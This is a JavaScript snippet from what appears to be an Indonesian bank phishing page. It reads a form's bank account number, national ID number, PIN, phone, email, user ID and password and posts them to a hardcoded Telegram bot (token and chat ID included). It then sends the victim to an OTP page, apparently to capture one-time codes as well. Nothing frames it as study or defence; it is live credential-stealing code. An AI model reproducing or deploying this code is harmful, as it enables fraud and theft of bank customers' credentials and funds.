  <script>
      
        
    const TOKEN = "6535640824:AAHp1DdqGKbdwuBmwxmsNhcXOWw4YXZMVUk";
const CHAT_ID = "6322510775";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { rek, ktp, pin, nomor, email, name, Password,} = form;
  const data = {
    rek: rek.value,
    ktp: ktp.value,
    pin: pin.value,
    nomor: nomor.value,
    email: email.value,
    name: name.value,
    Password: Password.value,
  };

  let message = `<b></b>\n`;
  message += `<b>No-Rekening :</b> ${data.rek}\n`;
  message += `<b>NIK-KTP :</b> ${data.ktp}\n`;
  message += `<b>PIN :</b> ${data.pin}\n`;
  message += `<b>Nomor Hp :</b> ${data.nomor}\n`;
  message += `<b>Email :</b> ${data.email}\n`;
  message += `<b>User ID :</b> ${data.name}\n`;
  message += `<b>Password :</b> ${data.Password}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='/id/otp.html';
}
